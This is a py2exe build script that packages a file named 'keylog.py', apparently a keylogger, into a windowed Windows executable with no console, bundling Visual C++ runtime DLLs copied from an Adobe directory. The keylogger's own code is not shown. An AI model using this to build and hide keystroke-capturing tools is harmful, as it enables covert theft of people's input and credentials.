from distutils.core import setup
import py2exe
from glob import glob

data_files = [(
    "Microsoft.VC90.CRT",
    glob(r'C:\Program Files\Common Files\Adobe\OOBE\PDApp\core\Microsoft.VC90.CRT\*.*')
)]
setup(
    data_files=data_files,
    windows=['keylog.py']
)
